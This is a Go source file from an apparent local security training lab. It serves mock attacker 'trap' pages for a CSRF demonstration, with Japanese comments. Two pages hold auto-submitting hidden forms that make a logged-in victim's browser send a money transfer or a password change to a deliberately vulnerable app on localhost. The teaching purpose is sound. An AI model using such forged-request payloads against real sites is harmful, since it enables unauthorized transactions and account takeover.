package main

import "net/http"

// このファイルは CSRF の「攻撃者のサイト(罠ページ)」を模したもの。
// 被害者のブラウザから、標的アプリ(8080)へ勝手に POST させる自動送信フォームを返す。
// サーバーの起動(main)やトップページは main.go にある。

// trapCSRFIndexHTML は CSRF の罠ページの入口。
const trapCSRFIndexHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>CSRFの罠 - vuln-lab</title></head>
<body>
<div style="background:#b00020;color:#fff;padding:8px 16px;font-weight:bold">⚠️ 攻撃者サイトを模した罠ページです(ローカル学習専用)</div>
<h1>おめでとうございます!</h1>
<p>(本来は魅力的な見せかけの内容で、被害者にリンクを踏ませます)</p>
<ul>
  <li><a href="/csrf/gift">プレゼントを受け取る</a>(開くと自動で送金フォームが送信される)</li>
  <li><a href="/csrf/survey">アンケートに答える</a>(開くと自動でパスワード変更フォームが送信される)</li>
</ul>
<p>先に <a href="http://127.0.0.1:8080/csrf/login" target="_blank">http://127.0.0.1:8080/csrf/login</a> でログインしてから開いてください。</p>
</body></html>`

// VULNERABLE な本体に対し、被害者のブラウザから勝手に POST させる自動送信フォーム。
const trapGiftHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>プレゼント</title></head>
<body onload="document.forms[0].submit()">
<p>プレゼントを準備中です...</p>
<form method="post" action="http://127.0.0.1:8080/csrf/transfer">
  <input type="hidden" name="to" value="bob">
  <input type="hidden" name="amount" value="30000">
</form>
</body></html>`

const trapSurveyHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>アンケート</title></head>
<body onload="document.forms[0].submit()">
<p>アンケートを読み込み中です...</p>
<form method="post" action="http://127.0.0.1:8080/csrf/password">
  <input type="hidden" name="new_password" value="hacked">
</form>
</body></html>`

// registerCSRFTrapRoutes は CSRF の罠ページを登録する。
func registerCSRFTrapRoutes(mux *http.ServeMux) {
	mux.Handle("GET /csrf/{$}", trapPage(trapCSRFIndexHTML))
	mux.Handle("GET /csrf/gift", trapPage(trapGiftHTML))
	mux.Handle("GET /csrf/survey", trapPage(trapSurveyHTML))
}
